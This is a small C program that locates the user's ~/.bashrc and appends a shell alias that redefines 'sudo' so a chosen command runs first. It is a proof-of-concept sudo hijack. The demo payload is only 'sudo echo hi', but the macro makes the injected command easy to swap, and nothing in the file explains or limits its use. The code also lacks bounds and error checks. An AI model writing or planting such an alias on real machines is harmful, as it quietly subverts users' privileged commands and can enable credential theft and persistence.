#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#define MAX_PATH 255
#define COMMAND_TO_GET_HOME "echo $HOME"
#define SUDO_COMMAND "sudo echo hi"

int main(){
	FILE *command = popen(COMMAND_TO_GET_HOME,"r"); //Get $HOME
	char path[MAX_PATH];

	//If we could not run a command
	if(command == NULL){
		printf("%s did not work\n",COMMAND_TO_GET_HOME);
		exit(1);
	}

	//Put command into path
	fgets(path,sizeof(path),command);
	char *pos;

	//Get rid of newline
	if ((pos=strchr(path, '\n')) != NULL){
    		*pos = '\0';
	}
	else{
		printf("Could not find newline\n");
		exit(1);
	}

	//Add /.bashrc to path
	strcat(path,"/.bashrc");

	printf("%s\n",path);

	//Open /.bashrc
	FILE *writer = fopen(path,"a");

	//Creates alias to run SUDO_COMMAND then sudo
	fputs("alias sudo=\'",writer);
	fputs(SUDO_COMMAND,writer);
	fputs("; sudo\'\n",writer);
}
